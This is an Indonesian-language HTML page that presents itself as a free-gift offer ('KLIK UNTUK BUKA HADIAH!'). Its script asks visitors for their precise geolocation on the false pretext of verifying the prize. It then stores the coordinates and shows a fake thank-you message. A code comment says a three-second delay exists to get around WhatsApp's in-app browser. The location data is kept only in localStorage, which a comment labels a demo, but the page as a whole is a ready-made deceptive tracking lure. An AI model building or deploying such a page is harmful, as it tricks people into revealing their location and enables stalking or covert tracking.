<html>
<head>
    <title>Konten Menarik!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 20px;
            max-width: 90%;
        }
        .btn {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            transition: all 0.3s;
        }
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(0,0,0,0.25);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÅ KLIK UNTUK BUKA HADIAH!</h1>
        <p class="text-sm text-gray-600">Anda akan diminta izin lokasi untuk verifikasi</p>
        <button id="btn" class="btn mt-6">BUKA SEKARANG</button>
    </div>

    <script>
        // Tunggu 3 detik untuk bypass browser WhatsApp
        setTimeout(() => {
            document.getElementById('btn').onclick = () => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            const {latitude, longitude, accuracy} = pos.coords;
                            // Simpan ke localStorage admin (untuk demo)
                            localStorage.setItem('lastLocation', 
                                `${latitude},${longitude},${accuracy}`);
                            
                            alert('Terima kasih! Hadiah akan segera dikirim.');
                        },
                        (err) => {
                            alert('Akses lokasi dibutuhkan untuk melanjutkan.');
                        },
                        {enableHighAccuracy: true, timeout: 10000}
                    );
                } else {
                    alert('Browser tidak mendukung geolocation.');
                }
            };
        }, 3000);
    </script>
</body>
</html>
